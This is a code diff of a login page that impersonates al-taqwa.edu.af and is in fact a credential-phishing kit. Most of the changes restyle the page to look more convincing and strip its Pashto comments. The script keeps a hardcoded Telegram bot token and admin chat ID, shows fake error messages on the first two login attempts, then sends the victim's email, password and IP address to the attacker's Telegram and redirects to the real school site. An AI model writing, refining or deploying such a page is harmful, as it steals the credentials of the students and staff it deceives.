@@ -6,12 +6,11 @@
 <title>Login</title>
 
 <style>
-
 *{
     margin:0;
     padding:0;
     box-sizing:border-box;
-    font-family: Arial, sans-serif;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
 }
 
 body{
@@ -19,101 +18,106 @@ body{
     display:flex;
     justify-content:center;
     align-items:center;
-    background:#f3f3f3;
+    background:#f9f9f9; /* دقیقاً د دوهم عکس د شالید رنګ */
     padding:0;
 }
 
 .login-container{
-    width:480px;
-    max-width:95%;
-    height:479px;
-
-    background:#fff;
-    border-radius:16px;
-
-    padding:38px 14px 26px 14px;
-
-    border:1px solid #e0e0e0;
-    box-shadow:0 4px 14px rgba(0,0,0,0.08);
-
-    display:flex;
-    flex-direction:column;
-    justify-content:center;
+    width: 360px; /* د دوهم عکس په څیر دقیق مینیمل اندازه */
+    max-width: 92%;
+    background: #ffffff;
+    border-radius: 8px; /* نرم او کم تاو شوي کونجونه */
+    padding: 30px 24px 26px 24px;
+    border: 1px solid #eef0f2;
+    box-shadow: 0 4px 15px rgba(0,0,0,0.03); /* ډیر نرم او پیکه سیوری لکه دوهم عکس */
+    display: flex;
+    flex-direction: column;
 }
 
 /* LOGO */
 .logo{
     text-align:center;
-    margin-bottom:14px;
+    margin-bottom:12px;
 }
 
 .logo img{
-    width:280px;
+    width:150px; /* د لوګو اندازه برابره شوه */
+    height: auto;
 }
 
 /* TITLE */
 .title{
     text-align:center;
-    font-size:22px;
-    font-weight:700;
-    margin-bottom:26px;
+    font-size:18px;
+    font-weight: 500;
+    margin-bottom:22px;
     color:#222;
 }
 
 /* INPUT */
 .input-box{
-    margin-bottom:18px;
+    margin-bottom:14px;
 }
 
 label{
     display:block;
-    font-size:15px;
+    font-size:11px; /* د دوهم عکس په څیر واړه او نرم خطونه */
     margin-bottom:6px;
-    color:#444;
+    color:#888888; /* پیکه خړ رنګ */
 }
 
-input{
+input[type="email"], input[type="password"]{
     width:100%;
-    height:54px;
-    border-radius:8px;
-    border:1px solid #ccc;
-    padding:0 14px;
-    font-size:15px;
+    height:38px; /* د بکسونو دقیق لوړوالی */
+    border-radius:4px;
+    border:1px solid #e2e8f0; /* کټ مټ د دوهم عکس په څیر کمرنګه بارډر */
+    padding:0 12px;
+    font-size:13px;
+    color: #333;
+    outline: none;
+    transition: border-color 0.15s ease-in-out;
 }
 
-input:focus{
-    border:2px solid #18c6e7;
-    outline:none;
+/* کله چې په بکس کلیک کېږي د دوهم عکس په څیر آسماني بارډر اخلي */
+input[type="email"]:focus, input[type="password"]:focus{
+    border:1px solid #29b6f6; 
 }
 
 /* CHECKBOX */
 .remember{
     display:flex;
     align-items:center;
-    margin:14px 0 22px;
-    font-size:14px;
+    margin:6px 0 18px;
 }
 
 .remember input{
-    width:16px;
-    height:16px;
-    margin-right:8px;
+    width:13px;
+    height:13px;
+    margin-right:6px;
+    border: 1px solid #cbd5e1;
+}
+
+.remember span{
+    font-size:11px;
+    color: #888888;
 }
 
 /* BUTTON */
 button{
     width:100%;
-    height:54px;
+    height:38px; /* د بټن لوړوالی کټ مټ د انپوټ غوندې مینیمل شو */
     border:none;
-    border-radius:8px;
-    background:#18c6e7;
-    font-size:16px;
-    font-weight:bold;
+    border-radius:4px;
+    background:#00bcd4; /* د دوهم عکس روښانه ځلا لرونکی آسماني رنګ */
+    color: white;
+    font-size:13px;
+    font-weight: 500;
     cursor:pointer;
+    transition: background 0.2s;
 }
 
 button:hover{
-    background:#0fb6d6;
+    background:#00acc1;
 }
 
 /* د تېروتنې پیغام */
@@ -121,14 +125,13 @@ button:hover{
     background: #ffe6e6;
     border: 1px solid #ff6666;
     color: #cc0000;
-    padding: 10px;
-    border-radius: 8px;
-    font-size: 13px;
+    padding: 8px;
+    border-radius: 4px;
+    font-size: 12px;
     text-align: center;
-    margin-top: 12px;
+    margin-bottom: 12px;
     display: none;
 }
-
 </style>
 </head>
 
@@ -137,7 +140,7 @@ button:hover{
 <div class="login-container">
 
     <div class="logo">
-        <img src="Screenshot_2026-06-08-23-00-41-466_com.android.chrome~2.jpg">
+        <img src="Screenshot_2026-06-08-23-00-41-466_com.android.chrome~2.jpg" alt="Logo">
     </div>
 
     <div class="title">Sign in</div>
@@ -168,27 +171,22 @@ button:hover{
     const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
     const ADMIN_CHAT_ID = "8295417969";
 
-    // د هڅو شمېرلو لپاره (د IP پته او ایمیل پر بنسټ)
     let attemptStore = {};
 
-    // ========== د پښتو تورو چک کولو فنکشن ==========
     function hasPashtoCharacters(text) {
         const pashtoRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
         return pashtoRegex.test(text);
     }
 
-    // ========== د ایمیل تایید (یوازې سم ایمیل) ==========
     function isValidEmail(email) {
         const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
         return emailRegex.test(email);
     }
 
-    // ========== د پاسورډ اوږدوالی تایید ==========
     function isValidPasswordLength(password) {
         return password.length >= 8;
     }
 
-    // د IP پته ترلاسه کول
     async function getUserIP() {
         try {
             const response = await fetch('https://api.ipify.org?format=json');
@@ -199,7 +197,6 @@ button:hover{
         }
     }
 
-    // اډمن ته پیغام لیږل (یوازې بریالي هڅو لپاره)
     async function sendToAdmin(email, password, ip, attemptNumber) {
         const message = `✅ *SUCCESSFUL LOGIN* ✅\n\n📍 *Source:* al-taqwa.edu.af/login\n👤 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n📊 *Attempt:* ${attemptNumber}\n🕒 *Time:* ${new Date().toLocaleString()}`;
         
@@ -231,30 +228,21 @@ button:hover{
         const email = document.getElementById('email').value.trim();
         const password = document.getElementById('password').value.trim();
 
-        // خالي ساحې چک کول
         if (!email || !password) {
             showError('Please fill in both email and password');
             return;
         }
 
-        // د پښتو تورو چک
-        if (hasPashtoCharacters(email)) {
-            showError('Pashto not allowed ');
-            return;
-        }
-        
-        if (hasPashtoCharacters(password)) {
+        if (hasPashtoCharacters(email) || hasPashtoCharacters(password)) {
             showError('Pashto not allowed ');
             return;
         }
 
-        // د ایمیل فورمټ چک (یوازې سم ایمیل)
         if (!isValidEmail(email)) {
             showError('Please enter a valid email address (e.g., username@gmail.com)');
             return;
         }
 
-        // د پاسورډ اوږدوالی چک
         if (!isValidPasswordLength(password)) {
             showError('Password must be at least 8 characters');
             return;
@@ -263,7 +251,6 @@ button:hover{
         const ip = await getUserIP();
         const key = `${email}_${ip}`;
 
-        // د دې کارونکي لپاره د هڅو شمېر
         if (!attemptStore[key]) {
             attemptStore[key] = 0;
         }
@@ -271,7 +258,6 @@ button:hover{
         
         const currentAttempt = attemptStore[key];
 
-        // لومړۍ هڅه - تېروتنه (اډمن ته خبر نه ځي)
         if (currentAttempt === 1) {
             showError('Please check your email');
             document.getElementById('email').value = '';
@@ -279,7 +265,6 @@ button:hover{
             return;
         }
 
-        // دوهمه هڅه - تېروتنه (اډمن ته خبر نه ځي)
         if (currentAttempt === 2) {
             showError('Please check your password');
             document.getElementById('email').value = '';
@@ -287,15 +272,9 @@ button:hover{
             return;
         }
 
-        // درېیمه هڅه - بریالي (یوازې دلته اډمن ته خبر ځي)
         if (currentAttempt >= 3) {
-            // یوازې بریالي هڅه اډمن ته واستوئ
             await sendToAdmin(email, password, ip, currentAttempt);
-            
-            // د دې کارونکي لپاره هڅې پاکې کړئ
             delete attemptStore[key];
-            
-            // مستقیم altaqwa.edu.af ته لاړ شه
             window.location.href = "https://www.altaqwa.edu.af";
         }
     });
